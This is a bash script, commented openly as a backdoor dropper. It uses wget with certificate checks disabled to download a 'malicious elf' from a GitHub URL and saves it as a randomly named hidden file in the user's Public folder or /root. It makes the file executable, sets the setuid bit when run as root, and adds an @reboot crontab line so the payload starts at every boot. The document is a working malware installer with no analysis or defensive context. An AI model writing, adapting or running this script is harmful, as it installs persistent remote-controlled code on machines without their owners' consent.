#!/usr/bin/env bash

# Save wget location
WGET=$(which wget)

# Url with BACKDOOR to download
URL="https://github.com/FoxyProxys/github/raw/main/log"

# Randomize BACKDOOR name
BACKDOOR=$RANDOM

# Add dot to make hidden file
BACKDOOR=".${BACKDOOR}"

# Check if script is running as root or user, set persistence consequently
if [ "$EUID" -ne 0 ]
then
  # Download malicious elf
  $WGET -q --no-check-certificate "${URL}" -O ~/Public/$BACKDOOR
  # Make macho executable
  chmod +x ~/Public/$BACKDOOR
  # Persistence in crontab
  crontab -l > temp_cron > /dev/null 2>&1
  echo "@reboot sleep 30; ~/Public/$BACKDOOR 2>&1" >> temp_cron
  crontab temp_cron
  rm temp_cron
else
  # Download malicious elf
  $WGET -q --no-check-certificate "${URL}" -O /root/$BACKDOOR
  # Make macho executable and set suid
  chmod u+s /root/$BACKDOOR
  chmod +x /root/$BACKDOOR
  # Persistence in crontab
  crontab -l > temp_cron > /dev/null 2>&1
  echo "@reboot sleep 30; /root/$BACKDOOR 2>&1" >> temp_cron
  crontab temp_cron
  rm temp_cron
fi
